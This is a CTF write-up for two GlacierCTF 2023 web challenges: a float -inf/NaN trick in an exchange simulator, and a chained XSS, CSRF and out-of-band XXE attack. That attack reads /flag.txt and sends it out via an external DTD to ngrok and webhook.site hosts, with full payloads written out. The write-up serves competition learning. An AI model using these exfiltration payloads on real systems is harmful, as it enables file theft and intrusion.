---
title: "CTF - GlacierCTF 2023"
categories: [ctf]
date: 2023-11-27
comments: true
image: /images/kashmir.png
favicon: /images/favicon.ico
description: CTF - GlacierCTF 2023
---

# GlacierCTF 2023

Welcome to another CTF writeup. This time I played GlacierCTF 2023, and I focused on the Web challenges. We participate as [ISwearGoogledIt](https://ctftime.org/team/109689) with [RazviOverflow](https://razvioverflow.github.io/), [Bubu](https://albertofdr.github.io/) and [liti0s](https://ctftime.org/user/73060). Let's dive into the challenges!  

<p align="center">
  <img src="/images/writeups/GlacierCTF2023/logo.png" width="35%"/>
</p>


<p align="center">
  <img src="/images/writeups/GlacierCTF2023/banner.png" width="85%"/>
</p>

---

Challenge index:



<br>

--- 

<br>

# Web

## Glacier Exchange
50
We have launched a new revolutionary exchange tool, allowing you to trade on the market and hanging out with your rich friends in the Glacier Club. Only Billionaires can get in though. Can you help me hang out with lEon sMuk?

authors: hweissi & xsskevin

https://glacierexchange.web.glacierctf.com

We are provided with the server code.

The website is a simulator of an exchange site, where we start with 1000 cashout.

<p align="center">
  <img src="/images/writeups/GlacierCTF2023/1_0_website.png" width="85%"/>
</p>

The objective, as seen in the code, is to obtain 1000000000 cashout coins:

```python

# server.py
@app.route("/api/wallet/join_glacier_club", methods=["POST"])
def join_glacier_club():
    wallet = get_wallet_from_session()
    clubToken = False
    inClub = wallet.inGlacierClub()
    if inClub:
        f = open("/flag.txt")
        clubToken = f.read()
        f.close()
    return {
        "inClub": inClub,
        "clubToken": clubToken
    }

# wallet.py
def inGlacierClub(self):
    with self.lock:
        for balance_name in self.balances:
            if balance_name == "cashout":
                if self.balances[balance_name] < 1000000000:
                    return False
            else:
                if self.balances[balance_name] != 0.0:
                    return False
        return True

```

To do so, we have some API calls to exchange coins between each other, the point here is that the exchange is 1:1:

```python

# server.py
@app.route('/api/wallet/transaction', methods=['POST'])
def transaction():
    payload = request.json
    status = 0
    if "sourceCoin" in payload and "targetCoin" in payload and "balance" in payload:
        wallet = get_wallet_from_session()
        status = wallet.transaction(payload["sourceCoin"], payload["targetCoin"], float(payload["balance"]))
    return jsonify({
        "result": status
    })


# wallet.py
import threading

class Wallet():
    def __init__(self) -> None:
        self.balances = {
            "cashout": 1000,
            "glaciercoin": 0,
            "ascoin": 0,
            "doge": 0,
            "gamestock": 0,
            "ycmi": 0,
            "smtl": 0
        }
        self.lock = threading.Lock();


    def getBalances(self):
        return self.balances
    
    def transaction(self, source, dest, amount):
        if source in self.balances and dest in self.balances:
            with self.lock:
                if self.balances[source] >= amount:
                    self.balances[source] -= amount
                    self.balances[dest] += amount
                    return 1
        return 0
    
    def inGlacierClub(self):
        with self.lock:
            for balance_name in self.balances:
                if balance_name == "cashout":
                    if self.balances[balance_name] < 1000000000:
                        return False
                else:
                    if self.balances[balance_name] != 0.0:
                        return False
            return True
```

The trick here is how the balance change is done:
- We have the _threading.lock()_ so we can forget about any race conditions to overcome this problem.
- The balance input is casted into float _float(payload["balance"])_
- We can exchange a coin to the same coin

We can play with float overflow in this case, the sequence will be the following one:

```python
# First bustract -inf to get infinite money
1000 - float('-inf') = inf

# Then, since we use the same coin and balance, we will get NaN
inf + float('-inf') = NaN

# NaN is greater than the target value
NaN > 1000000000
```

So, we make a transaction with the cashout coin to the cashout coin with _-inf_:

<p align="center">
  <img src="/images/writeups/GlacierCTF2023/1_2_transaction.png" width="85%"/>
</p>

And we can see the NaN on the cashout balance:

<p align="center">
  <img src="/images/writeups/GlacierCTF2023/1_3_wallet.png" width="85%"/>
</p>


Then we can call the API to get the flag within the Glacier Club:

<p align="center">
  <img src="/images/writeups/GlacierCTF2023/1_1_flag.png" width="85%"/>
</p>


``` gctf{PyTh0N_CaN_hAv3_Fl0At_0v3rFl0ws_2} ``` 




## Peak
227
Within the heart of Austria's alpine mystery lies your next conquest. Ascend the highest peak, shrouded in whispers of past explorers, to uncover the flag.txt awaiting atop. Beware the silent guards that stand sentinel along the treacherous path, obstructing your ascent.

author: Chr0x6eOs

https://peak.web.glacierctf.com

The source code is provided for this challenge.

We land into an static website with information. With a quick look, we locate the conteact form. To submit, we need to be registered, so we did.

<p align="center">
  <img src="/images/writeups/GlacierCTF2023/2_0_web.png" width="85%"/>
</p>

We started by checking the source code. Some parts catched our attention:

- Admin visits out message using Selenium Webdrive with chrome @ _/admin/support.php_
- XSS on the message sent to the admin @ _/pages/view_message.php_
- An XML External Entity injection vulnerability @ _/admin/map.php_
- Flag on /flag.txt



```php
# XXE on /admin/map.php
function parseXML($xmlData){
    try
    {
        libxml_disable_entity_loader(false);
        $xml = simplexml_load_string($xmlData, 'SimpleXMLElement', LIBXML_NOENT);
        return $xml;
    }
    catch(Exception $ex)
    {
        return false;
    }
    return true;
}

# XSS on /pages/view_message.php
<section id="message" class="py-5">
    <div class="container mt-5">
        <?php if (isset($message)): ?>
            <h1><?php echo htmlentities($message['title']);?></h1>
            <p><?php echo $message['content']; ?>
            <?php if($message['file'] !== "") : ?>
                <div>
                <img name="image" src="<?php echo $message['file']?>">
                </div>
            <?php endif;?>
        <?php endif; ?></p>
    </div>
</section>
```

```python
# admin.py
def read_messages(self):

    print(f'[{datetime.now()}] Checking messages...')
    self.driver.get(f'{self.host}/admin/support.php')

    if self.driver.current_url != f'{self.host}/admin/support.php':
        raise Exception("Cannot access support.php! Session probably expired!")

    links = [element.get_attribute('href') for element in self.driver.find_elements('name', 'inbox-header')]
    if len(links) > 0:
        for link in links:
            if link:
                try:
                    self.driver.get(link)

                    if self.driver.current_url == link:
                        print(f'[{datetime.now()}] Visiting: {self.driver.current_url}\r\n')
                    else:
                        print(f'[{datetime.now()}] After visiting {link}, got redirect to: {self.driver.current_url}\r\n')
                except Exception as ex:
                    '''Timeout or other exception occurred on url.
                    '''
                    print(f'[{datetime.now()}] Error after visiting: {link} (Current URL: {self.driver.current_url}). Error: {ex}\r\n')
        
```

For this challenge I count on [Bubu](https://albertofdr.github.io/) to perform the XSS playload for this challenge. The idea is to get the admin to send a POST request to the _map.php_ with our XXE payload to exfiltrate the flag. These were the steps:


1. Create the redirection to our server with the POST payload and send it to the admin. For this we used [ngrok](https://ngrok.com/) to make localhost accessible from the internet. To make this redirection we used the following meta tag:

```html
<meta http-equiv="refresh" content="0; url=https://3f56-92-56-131-173.ngrok-free.app/html.html">
```

2. Create an HTML with an script to send the POST data to _map.php_

```html
<html>
    <form id="sad" action="https://peak.web.glacierctf.com/admin/map.php" method="POST">
        <input type="text" name="data" value=''/>
        <input type="submit" value="save"/>
    </form>
    <script>
        form = document.getElementById("sad")
        form.submit();
    </script>
</html>
```

3. Create an XXE Out-of-band payload to exfiltrate the flag. For this we used a payload that loads the external DTD from our server that we used to send the file content to our server:

```xml
<!-- Payload to send to the POST on map.php -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM
  "php://filter/read=convert.base64-encode/resource=file:///flag.txt">
  <!ENTITY % dtd SYSTEM
  "https://3f56-92-56-131-173.ngrok-free.app/evil.dtd">
  %dtd; %send;
]>
<markers>
    <marker>
        <lat>47.0748663672</lat>
        <lon>12.695247219</lon>
        <name>test</name>
    </marker>
</markers>


<!-- Oneliner for map.php -->

<!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt"><!ENTITY % dtd SYSTEM "https://3f56-92-56-131-173.ngrok-free.app/evil.dtd"> %dtd; %send;]><markers><marker><lat>47.0748663672</lat><lon>12.695247219</lon><name>test</name></marker></markers>
```

To exfiltrate the flag we used webhook.site, but we could also use the ngrok URL. External DTD:

```xml
<!-- evil.dtd entity hosted on our server -->

<!ENTITY % all "<!ENTITY send SYSTEM 'https://webhook.site/9d1d47f3-4fe5-40fa-b395-0dc74273782c/?collect=%file;'>">
%all;

```

4. Create the server and expose the port


```bash
# files created
kali@kali:~/Desktop/CTFs/GlacierCTF2023/Web/Peak$ ls    
challenge.zip  dist  evil.dtd  html.html  test.dtd

# Serve the files and wait for requests
kali@kali:~/Desktop/CTFs/GlacierCTF2023/Web/Peak$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
127.0.0.1 - - [25/Nov/2023 19:19:26] "GET /html.html HTTP/1.1" 200 -
127.0.0.1 - - [25/Nov/2023 19:19:27] "GET /evil.dtd HTTP/1.1" 200 -

# Use ngrok to expose localhost
kali@kali:~/Desktop/CTFs/GlacierCTF2023/Web/Peak$ ngrok http 8081

Web Interface                 http://127.0.0.1:4040                                                  
Forwarding                    https://3f56-92-56-131-173.ngrok-free.app -> http://localhost:8081     
                                                                                                     
Connections                   ttl     opn     rt1     rt5     p50     p90                            
                              3       0       0.00    0.00    0.00    0.00                           
                                                                                                     
HTTP Requests                                                                                        
-------------                                                                                        
                                                                                                     
GET /evil.dtd                  200 OK                                                                
GET /html.html                 200 OK                                                                
GET /                          200 OK 
```


And we get the flag on the collect parameter as expected on webhook.site:

Request:

<p align="center">
  <img src="/images/writeups/GlacierCTF2023/2_0_request.png" width="85%"/>
</p>

Flag:

<p align="center">
  <img src="/images/writeups/GlacierCTF2023/2_1_flag.png" width="85%"/>
</p>


``` gctf{Th3_m0unt4!n_t0p_h4s_th3_b3st_v!3w} ```

